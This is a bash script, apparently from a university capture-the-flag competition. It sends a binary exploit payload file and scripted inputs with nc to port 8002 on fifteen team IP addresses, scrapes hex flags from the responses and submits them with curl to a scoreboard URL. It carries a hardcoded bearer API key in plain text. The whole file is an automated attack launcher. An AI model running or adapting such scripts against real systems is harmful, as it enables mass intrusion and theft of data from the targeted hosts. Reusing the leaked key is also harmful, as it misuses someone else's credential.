#!/bin/bash

ips=(
    "10.219.255.2" "10.219.255.6" "10.219.255.14" "10.219.255.18"
    "10.219.255.22" "10.219.255.26" "10.219.255.30" "10.219.255.34"
    "10.219.255.38" "10.219.255.42" "10.219.255.46" "10.219.255.50"
    "10.219.255.54" "10.219.255.58" "10.219.255.62"
)

submit_url="https://ctf.hackintro25.di.uoa.gr/submit"
api_key="f99e197afa7122298b9b948accf205313ee28954a2af6a98710317f8dc80ea52"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PAYLOAD="$SCRIPT_DIR/map_payload.bin"

if [[ ! -f "$PAYLOAD" ]]; then
    echo "[!] File '$PAYLOAD' not found!"
    exit 1
fi

for ip in "${ips[@]}"; do

    echo "[+] Trying http://$ip:8002/cart.php"
    
    response=$({
        echo "y"         
        sleep 0.2         
        cat "$PAYLOAD"     
        sleep 0.2         
        echo "y"
        sleep 0.2          
        echo "AAAAAAAAAAAAAAAA"       
        sleep 0.2
        echo "y"     
        sleep 0.2        
        echo "n"
    } | nc "$ip" 8002 -w 2 )

    tail_section=$(echo -n "$response" | tail -c 200)
    flag=$(echo "$tail_section" | grep -Eo '[a-fA-F0-9]{8,64}' | tr -d '\n')

    if [[ -n "$flag" ]]; then
        echo "[!] Flag found:: $flag"

        submit_response=$(curl -s -w "%{http_code}" -o /tmp/submit_out \
            -H "Content-Type: application/json" \
            -H "Authorization: Bearer $api_key" \
            -d "{\"flag\": \"$flag\"}" \
            "$submit_url")

        if [[ "$submit_response" == "200" ]]; then
            echo "[✓] Flag submitted successfully!"
        else
            echo "[!] Submission failed: HTTP $submit_response"
            cat /tmp/submit_out
        fi
    else
        echo "[-] No flag found."
    fi
done